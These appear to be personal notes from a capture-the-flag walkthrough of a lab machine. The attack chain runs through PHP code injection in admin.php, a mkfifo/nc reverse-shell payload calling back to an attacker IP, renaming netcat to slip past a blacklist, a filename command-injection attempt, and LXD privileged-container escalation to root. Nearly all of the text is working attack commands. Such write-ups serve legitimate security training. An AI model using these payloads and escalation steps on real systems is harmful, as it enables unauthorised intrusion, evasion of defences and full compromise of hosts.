1. gobuster 
	gobuster dir -u 10.10.10.27 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -t 25 -o log.txt

2. We see an admin.php page that has a password if view the source page all the way to the right. Use that
   in conjunction with the user being "admin".

3. We can write html and it parses it. Can get code execution by writing php code in user query box.
   We get immediate code execution: <?php system('ls -la'); ?>

4. We try to execute the following however out shell dies:
	GET /admin.php?html=<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.36 1234 >/tmp/f'); ?> HTTP/1.1

	After which we attempt to find the root cause of this so we do a find on the file that was last
	modified with ctime: find /home -ctime -60
	This spits out a file under /home/xalvas/intrusions letting us know after looking at the contents 
	of the file, that nc is being blacklisted so next best thing to do is make a copy of netcat with
	a different name: cp /bin/nc /dev/shm/mc

	GET /admin.php?html=<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/dev/shm/mc 10.10.14.36 1234 >/tmp/f '); ?> HTTP/1.1

	Don't forget url encode all the strings being sent.

5. We now have a working shell.
6. We got xalvas directory and discover 3 different mp3 and wav files. Move them arround with modified nc.
7. Check the files, rick roll singing. Next use audio diff install with pip
	pip install audiodiff
   The files are not the same, might be a stego challenge. Replay inverse of wav file? Maybe. Use audacity.
   Import file and check effects, invert.
		Your password is 18547936..*
  This password is for the xalvas user, you may now ssh into the box as such user.

8. There is a binary in app direcoty called goodluck, this a setuid binary the needs to be exploted via 
   various buffer overflows. However we will try to get code execution by taking advantage of the nc 
   blacklisting to see if we can get code execution when triggering the binary.
   	touch -- 'nc $(sleep 100)'
	cp /bin/nc nc\ \$\(sleep\ 100\)
	chmod 755 nc\ \$\(sleep\ 100\)
	./nc\ \$\(sleep\ 100\) -lnvp 1337
	
   This does not however work.

9. Unintended root: (lxd containers) boot2root issue.
   Creating an alpine linux image 
	git clone https://github.com/saghul/lxd-alpine-builder.git 
	scp alpine-v3.11-i686-20200123_0308.tar.gz xalvas@10.10.10.27:~
	#### CReates machine template inside host ###
	lxc image import alpine-v3.11-i686-20200123_0308.tar.gz --alias alpine
	lxc image list
	lxc init alpine privesc -c security.privileged=true
	### go into config adding device device to container privesc device to add host-root with type disk
	lxc config device add privesc host-root disk source=/ path=/mnt/root/

   Mow to get root on lxc device
	lxc start privesc
	lxc exec privesc /bin/sh
	~ # cd /mnt/root/
   We can now access the filesystem and cat the root.txt file

	MORAL of the story, be careful with virtualization technology. Installing the technology may allow
	users with sudo privielges to be erroneously added and grant the ability to access places they 
	should not have access to.
